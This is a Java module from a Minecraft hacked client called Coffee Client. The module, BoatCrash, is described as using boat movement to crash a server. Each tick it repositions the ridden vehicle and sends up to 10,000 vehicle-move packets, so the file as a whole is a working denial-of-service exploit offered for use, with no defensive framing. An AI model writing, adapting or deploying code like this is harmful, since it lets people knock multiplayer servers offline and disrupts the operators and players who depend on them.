/*
 * Copyright (c) 2022 Coffee Client, 0x150 and contributors.
 * Some rights reserved, refer to LICENSE file.
 */

package coffee.client.feature.module.impl.exploit;

import coffee.client.CoffeeMain;
import coffee.client.feature.config.DoubleSetting;
import coffee.client.feature.module.Module;
import coffee.client.feature.module.ModuleType;
import coffee.client.helper.render.Renderer;
import coffee.client.helper.util.Utils;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3d;

import java.awt.Color;
import java.util.Objects;

public class BoatCrash extends Module {
    final DoubleSetting amount = this.config.create(new DoubleSetting.Builder(2000).name("Amount per tick")
        .description("How many packets to send per tick")
        .min(1)
        .precision(0)
        .max(10000)
        .get());
    boolean running = false;
    Vec3d start = null;

    public BoatCrash() {
        super("BoatCrash", "Uses boat movement to crash a server", ModuleType.EXPLOIT);
    }

    @Override
    public void tick() {
        if (Objects.requireNonNull(CoffeeMain.client.player).hasVehicle()) {
            Entity vehicle = CoffeeMain.client.player.getVehicle();
            if (!running) {
                BlockPos start = CoffeeMain.client.player.getBlockPos();
                this.start = new Vec3d(start.getX(), start.getY(), start.getZ());
            }
            running = true;
            Vec3d offset = Vec3d.fromPolar(0, vehicle.getYaw()).normalize();
            Objects.requireNonNull(vehicle).updatePosition(start.x + offset.x, start.y, start.z + offset.z);
            VehicleMoveC2SPacket p = new VehicleMoveC2SPacket(vehicle);
            for (int i = 0; i < amount.getValue(); i++) {
                Objects.requireNonNull(CoffeeMain.client.getNetworkHandler()).sendPacket(p);
            }
        } else {
            running = false;
        }
    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
        this.start = null;
        running = false;
    }

    @Override
    public String getContext() {
        return running ? "Running" : "Not running";
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {
        if (start != null) {
            if (CoffeeMain.client.player.hasVehicle()) {
                Vec3d offset = Vec3d.fromPolar(0, Objects.requireNonNull(CoffeeMain.client.player.getVehicle()).getYaw()).normalize();
                Renderer.R3D.renderFilled(matrices, Utils.getCurrentRGB(), start.subtract(.1, .1, .1), new Vec3d(.2, .2, .2));
                Renderer.R3D.renderLine(matrices, Color.RED, start, start.add(offset.x, 0, offset.z));
            }
        }
    }

    @Override
    public void onHudRender() {

    }

    @Override
    public void onFastTick_NWC() {
        if (CoffeeMain.client.world == null || CoffeeMain.client.player == null) {
            setEnabled(false);
        }
    }
}
